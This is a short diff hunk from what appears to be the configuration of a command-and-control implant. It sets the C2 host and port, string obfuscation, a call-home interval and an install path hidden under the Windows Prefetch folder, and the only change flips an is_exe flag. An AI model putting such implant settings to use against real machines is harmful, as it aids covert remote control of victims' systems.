@@ -7,7 +7,7 @@ let c2_scheme = protectString("http")
 let c2_address = protectString("localhost")
 let c2_port = 80
 # Agent
-let is_exe = true
+let is_exe = false
 let sleep_on_execution = 0
 let agent_execution_path = protectString("C:\\ProgramData\\Prefetch\\na.exe")
 var call_home_timeframe = 1
